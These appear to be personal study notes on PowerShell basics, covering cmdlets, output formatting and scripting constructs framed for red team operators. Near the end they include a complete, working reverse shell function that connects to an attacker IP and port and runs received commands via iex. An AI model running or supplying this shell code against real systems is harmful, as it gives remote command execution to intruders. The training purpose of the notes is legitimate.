
# ⚡ PowerShell Basic Notes

---

## 🧾 System Info Commands

| Command           | Description               |
|------------------|---------------------------|
| `$PSVersionTable` | Get PowerShell version     |
| `$Host`           | Information about the host |

---

## 📚 Cmdlet Basics

### 🔸 Get-Help

Useful for discovering how to use commands:

```powershell
Get-Help *process
Get-Help *service
Get-Help "alias"




	
 



- `Get-Help *process`: Shows help topics containing "process".
    
- `Get-Help *service`: Shows help topics related to "service".
    
- `Get-Help "alias"`: Shows help about aliases.
    
- `(Get-Alias | more)`: View all aliases with pagination.
    

### 🔸 Get-ChildItem

Used to list files and directories:


`Get-ChildItem -Path /media/idont/APT/tel/TheGolden/ -Filter windows*`

- List all items starting with "windows" in the specified path.
    

`Get-ChildItem -Attributes h`

- List all **hidden** files and folders.
    

---

## 🔍 Get-Command

Useful for discovering available commands:


`Get-Command -Type Cmdlet -Name *copy*`

- Find all cmdlets with "copy" in the name.
    


`Get-Command -Type Cmdlet | Measure-Object`

- Count all available cmdlets.
    

Example Output:



`Count : 255 
 Average           :
 Sum               :
 Maximum           :
 Minimum           :
 StandardDeviation :
 Property          :` 

---

## 🚀 Process Management


`Start-Process notepad Stop-Process -Id 1234`

- `Start-Process <name>`: Launch a process (e.g., Notepad).
    
- `Stop-Process -Id <ID>`: Kill a process using its ID.
    

---

## 📁 Copy Files



`Copy-Item "C:\example.txt" -Destination "D:\Backup\"`

- Copy a file or folder to a new location.
    

---



# 🎨 PowerShell Output Formatting

---

## 🧾 Overview

PowerShell outputs objects, not plain text. The **formatting system** defines how that output is displayed in the console. You can control how data is shown using **formatting cmdlets** or **output manipulation techniques**.

---

## 🔹 Common Formatting Cmdlets

### `Format-Table` (`ft`)
Displays output as a table.

```powershell
Get-Process | Format-Table Name, Id, CPU

- `-AutoSize`: Adjusts column width to fit content.
    
- `-Property`: Specify which properties to show.
    

Get-Process | Format-Table -Property Name, CPU -AutoSize



### `Format-List` (`fl`)

Displays output as a list of properties.

Get-Service | Format-List Name, Status
- Useful when objects have many properties.

### `Format-Wide` (`fw`)

Displays only one property per object in a wide format

Get-Command | Format-Wide Name -Column 3

## 🛠 Additional Output Cmdlets

### `Out-File`

Saves output to a file.

Get-Process | Out-File processes.txt

### `Export-Csv`

Exports objects as CSV.

Get-Service | Export-Csv -Path services.csv -NoTypeInformation

### `ConvertTo-Json`

Converts output to JSON format.

Get-Process | ConvertTo-Json

### `Select-Object`

Choose specific properties to output.

Get-Process | Select-Object Name, Id, CPU


## 🔁 Pipelining with Formatting

Always use formatting **at the end** of the pipeline.

❌ Incorrect:
Get-Process | Format-Table | Out-File wrong.txt

✅ Correct:
Get-Process | Out-File correct.txt

## 📌 Notes

- Formatting cmdlets (`Format-*`) are **for display only** – they turn objects into strings.
    
- Don't use them if you plan to **process the data further** (e.g., export or filter).

## 🧪 Practice Examples

# View services as a list
Get-Service | Format-List *

# Export all running processes as CSV
Get-Process | Where-Object {$_.CPU -gt 0} | Export-Csv processes.csv -NoTypeInformation

# Display command names in columns
Get-Command | Format-Wide Name -Column 4




# 🛡️ PowerShell Basics for Red Team Operators

## 📌 Variables

- Variables store data that can be used later.
- Every variable starts with `$`.

```powershell
$username = "admin"
$port = 8080
$isConnected = $false
$targetList = @("192.168.1.10", "192.168.1.20")
```

---

## 📌 Data Types

| Data Type    | Example                 | Description          |
|--------------|--------------------------|----------------------|
| String       | `"text"` or `'text'`      | Text values          |
| Integer (Int)| `80`, `443`               | Numeric values       |
| Boolean      | `$true`, `$false`         | True/False           |
| Array        | `@("a", "b", "c")`         | List of values       |
| HashTable    | `@{key="value"}`           | Key-Value pairs      |

> **Note:** You can explicitly declare data types:

```powershell
[string]$ipAddress = "192.168.1.5"
[int]$portNumber = 4444
[bool]$hasAccess = $true
```

---

## 📌 Conditions (If-Else)

Conditions are used to make decisions during script execution.

```powershell
if (condition) {
    # Code if condition is true
} elseif (anotherCondition) {
    # Code if another condition is true
} else {
    # Code if all conditions are false
}
```

### Example: Check connection status

```powershell
$isConnected = $true

if ($isConnected) {
    Write-Output "Connection Successful!"
} else {
    Write-Output "Connection Failed!"
}
```

### Example: Check port

```powershell
$port = 80

if ($port -eq 80) {
    Write-Output "HTTP service detected."
} elseif ($port -eq 443) {
    Write-Output "HTTPS service detected."
} else {
    Write-Output "Unknown service."
}
```

---

## 📌 Operators (Comparison Operators)

| Operator | Meaning         |
|----------|-----------------|
| `-eq`    | Equals           |
| `-ne`    | Not Equals       |
| `-gt`    | Greater Than     |
| `-lt`    | Less Than        |
| `-ge`    | Greater or Equal |
| `-le`    | Less or Equal    |
| `-like`  | String Matching  |
| `-contains` | Check existence in a collection |

---

## 📌 Functions

Functions allow you to define reusable code blocks.

```powershell
function Function-Name {
    param ($parameter1, $parameter2)
    # Code block
}
```

### Example: Ping a target

```powershell
function Test-Target {
    param ($ipAddress)

    if (Test-Connection -ComputerName $ipAddress -Count 1 -Quiet) {
        Write-Output "$ipAddress is online."
    } else {
        Write-Output "$ipAddress is offline."
    }
}

# Usage
Test-Target -ipAddress "192.168.1.10"
```

---

## 📌 Loops

Loops are used to repeat actions.

### ForEach Loop

```powershell
$targets = @("192.168.1.5", "192.168.1.10")

foreach ($target in $targets) {
    Test-Target -ipAddress $target
}
```

### For Loop

```powershell
for ($i = 0; $i -lt 5; $i++) {
    Write-Output "Attempt number: $i"
}
```

### While Loop

```powershell
$count = 0

while ($count -lt 3) {
    Write-Output "Connection Attempt: $count"
    $count++
}
```

---

## 📌 File Handling

Handling files is critical for Red Team operations (e.g., writing logs, storing results).

### Read a File

```powershell
$content = Get-Content -Path "C:\temp\wordlist.txt"
foreach ($line in $content) {
    Write-Output $line
}
```

### Write to a File

```powershell
"Scan complete!" | Out-File -FilePath "C:\temp\log.txt"
```

### Append to a File

```powershell
"New Entry" | Out-File -FilePath "C:\temp\log.txt" -Append
```

---

## 📌 Extra Practical Examples

### Create a Simple Reverse Shell

```powershell
function Start-ReverseShell {
    param ($ip, $port)

    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }

    $client.Close()
}

# Usage
# Start-ReverseShell -ip "10.10.10.5" -port 4444
```

---

## ✅ Best Practices

- Always use clear and meaningful variable names.
- Organize your scripts using functions for better readability.
- Handle sensitive data carefully (passwords, tokens, etc.).
- Practice writing modular and reusable scripts.
- Comment your code properly for future maintenance.

---

# 📚 Useful Commands

| Command                     | Purpose                             |
|------------------------------|-------------------------------------|
| `Test-Connection`            | Ping targets                       |
| `Invoke-WebRequest`          | Send HTTP requests                 |
| `Get-Content`                | Read files                         |
| `Out-File`                   | Write output to files              |
| `New-Object System.Net.Sockets.TCPClient` | Create TCP client  |

---

